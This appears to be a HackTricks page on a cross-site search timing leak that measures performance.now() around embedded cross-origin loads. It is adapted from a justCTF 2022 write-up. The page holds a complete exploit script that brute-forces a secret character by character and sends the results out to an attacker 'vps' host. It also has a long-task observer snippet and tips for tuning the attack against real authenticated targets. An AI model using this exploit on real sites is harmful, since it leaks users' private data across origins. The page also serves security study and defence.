# `performance.now()` + Forced Heavy Task

{{#include ../../banners/hacktricks-training.md}}

**Exploit taken from [https://blog.huli.tw/2022/06/14/en/justctf-2022-xsleak-writeup/](https://blog.huli.tw/2022/06/14/en/justctf-2022-xsleak-writeup/)**<sup>[[1]](#references)</sup>

In this challenge, the user could send thousands of characters. When the candidate flag substring matched, that large string was reflected to the bot. The attacker could therefore distinguish a matching candidate by measuring the extra work caused by the much larger response.<sup>[[1]](#references)</sup>

The important idea is that the **oracle is not just the request time**. The attacker intentionally makes one branch do **much more work** than the other one, and then measures the difference with `performance.now()` around an embedded cross-origin navigation. In practice the extra work can come from **larger reflected HTML/text**, **more DOM nodes to parse/layout/paint**, or even **expensive validation/highlighting logic** that only happens in one branch.<sup>[[2]](#references)</sup>

> [!WARNING]
> In the original challenge, a large explicit object width and height amplified the rendering-time difference; the default viewport was too small to produce a reliable signal.<sup>[[1]](#references)</sup>

```html
<!DOCTYPE html>
<html>
  <head> </head>
  <body>
    <img src="https://deelay.me/30000/https://example.com" />
    <script>
      fetch("https://deelay.me/30000/https://example.com")

      function send(data) {
        fetch("http://vps?data=" + encodeURIComponent(data)).catch((err) => 1)
      }

      function leak(char, callback) {
        return new Promise((resolve) => {
          let ss = "just_random_string"
          let url =
            `http://baby-xsleak-ams3.web.jctf.pro/search/?search=${char}&msg=` +
            ss[Math.floor(Math.random() * ss.length)].repeat(1000000)
          let start = performance.now()
          let object = document.createElement("object")
          object.width = "2000px"
          object.height = "2000px"
          object.data = url
          object.onload = () => {
            object.remove()
            let end = performance.now()
            resolve(end - start)
          }
          object.onerror = () => console.log("Error event triggered")
          document.body.appendChild(object)
        })
      }

      send("start")

      let charset = "abcdefghijklmnopqrstuvwxyz_}".split("")
      let flag = "justCTF{"

      async function main() {
        let found = 0
        let notFound = 0
        for (let i = 0; i < 3; i++) {
          await leak("..")
        }
        for (let i = 0; i < 3; i++) {
          found += await leak("justCTF")
        }
        for (let i = 0; i < 3; i++) {
          notFound += await leak("NOT_FOUND123")
        }

        found /= 3
        notFound /= 3

        send("found flag:" + found)
        send("not found flag:" + notFound)

        let threshold = found - (found - notFound) / 2
        send("threshold:" + threshold)

        if (notFound > found) {
          return
        }

        // exploit
        while (true) {
          if (flag[flag.length - 1] === "}") {
            break
          }
          for (let char of charset) {
            let trying = flag + char
            let time = 0
            for (let i = 0; i < 3; i++) {
              time += await leak(trying)
            }
            time /= 3
            send("char:" + trying + ",time:" + time)
            if (time >= threshold) {
              flag += char
              send(flag)
              break
            }
          }
        }
      }

      main()
    </script>
  </body>
</html>
```

## When this works best

This pattern is most useful when a candidate query changes **how expensive the target page is to process**, not only the response status code. Typical places to look for this are:<sup>[[1]](#references)[[2]](#references)</sup>

- **Search endpoints** that reflect a very large body only on a hit.
- **Preview/render endpoints** (Markdown, HTML, syntax highlighting, diff viewers) where one branch creates much more DOM/layout work.
- **Validation/filtering gadgets** where one input triggers expensive parsing, regex processing, highlighting, or templating while the other branch exits fast. Modern examples include `pattern` validation / ReDoS-style regex backtracking and syntax highlighters that only do the expensive path on a hit.
- **Same-site HTML injection** scenarios where you can embed an authenticated endpoint with `<object>` / `<iframe>` and turn a hit/miss difference into a timing oracle.

If the hit/miss difference is only a few bytes on the wire, the signal is usually too noisy. The trick becomes practical when you can amplify the positive or negative branch into a **clearly heavier parse/render/application task**.

## Practical reliability notes

- **Warm up first:** the first few measurements are often skewed by DNS, TCP/TLS setup, process scheduling, or JIT compilation. Do a few dummy requests before calibrating the threshold.
- **Defeat caches explicitly:** add random query parameters or random filler so repeated probes do not collapse into the HTTP cache or a reused application result.
- **Compression can kill the signal:** if the only difference is repeated text, gzip/brotli can shrink it heavily. Prefer responses that also increase **DOM size**, **layout work**, or **client-side processing time**.
- **Keep the embedded viewport large and deterministic:** fixed `width`/`height` on `<object>` or `<iframe>` helps because a tiny default viewport may hide the rendering cost you are trying to amplify.
- **Use median/average from several runs:** recompute a threshold from a known-hit and a known-miss sample, then classify each candidate with multiple probes instead of trusting one measurement.
- **If timer precision is coarse, amplify the task more:** a forced branch that regularly creates `50ms+` long tasks can sometimes still be classified with other clocks or `PerformanceObserver`, but only if the branch is truly heavy.
- **Verify authenticated embedding:** SameSite cookie rules, third-party-cookie restrictions, CSP `frame-ancestors`, X-Frame-Options, CORP, and Fetch Metadata checks can prevent the cross-origin object/frame from reaching the authenticated state whose secret you want to test.<sup>[[2]](#references)</sup>
- **Add timeouts and error handling:** an `object`/`iframe` load event is not guaranteed. A failed candidate must not stall the entire extraction loop.

## Browser reality in 2025+

A useful mental model is: **do not depend on ultra-fine timers; depend on a huge workload gap**. Browsers coarsen `performance.now()` in non-isolated contexts, so this technique is much more reliable when the hit/miss delta is in the **multi-millisecond** range, not when trying to distinguish tiny sub-millisecond differences.<sup>[[5]](#references)</sup>

In theory you can recover better timer precision from a **cross-origin isolated** page, but in practice that usually conflicts with generic XS-Search targets: isolation requires `COOP: same-origin` plus `COEP: require-corp` or `credentialless`, and `COEP` blocks many arbitrary cross-origin embeds unless the target explicitly opts into `CORP`/`CORS` or is loaded without credentials. For real attacks, assume you will usually be measuring from a **non-isolated attacker page** and design the heavy branch accordingly.<sup>[[4]](#references)</sup>

## Long Tasks API as a coarse Boolean oracle

If the heavy branch is expected to block the UI thread for **`>=50ms`**, you can also watch for `longtask` entries instead of trusting raw deltas only. This is especially useful when the response branch triggers **expensive layout/reflow/rendering** or client-side validation that creates a very visible stall.<sup>[[3]](#references)</sup>

> [!NOTE]
> The Long Tasks API has **limited browser support**, so treat it as an additional oracle, not as the only one.

<details>
<summary>Example: using <code>PerformanceObserver</code> as an extra oracle</summary>

```html
<script>
  const longtasks = []
  new PerformanceObserver((list) => {
    for (const entry of list.getEntries()) longtasks.push(entry.duration)
  }).observe({ type: "longtask", buffered: true })

  async function leakWithLongTasks(url) {
    longtasks.length = 0
    const obj = document.createElement("object")
    obj.width = "2000px"
    obj.height = "2000px"
    obj.data = url
    document.body.appendChild(obj)
    await new Promise((resolve) => (obj.onload = resolve))
    obj.remove()
    return Math.max(0, ...longtasks) >= 50
  }
</script>
```
</details>

This won't magically fix a weak oracle. It only helps when one branch really does produce **observable long tasks** and the other branch does not. If both branches stay below the long-task threshold, go back to **making the target do more work** or use another leak primitive.

For alternative clocks and contention-based variants, also check:

{{#ref}}
event-loop-blocking-+-lazy-images.md
{{#endref}}

## References

- [1] [justCTF 2022 XS-Leak Writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-xsleak-writeup/)
- [2] [XS-Leaks Wiki: Execution Timing](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/)
- [3] [MDN: PerformanceLongTaskTiming](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming)
- [4] [PortSwigger Research: Listen to the whispers - web timing attacks that actually work](https://portswigger.net/research/listen-to-the-whispers-web-timing-attacks-that-actually-work)
- [5] [MDN - `Performance.now()` security requirements and reduced precision](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now#security_requirements)

{{#include ../../banners/hacktricks-training.md}}
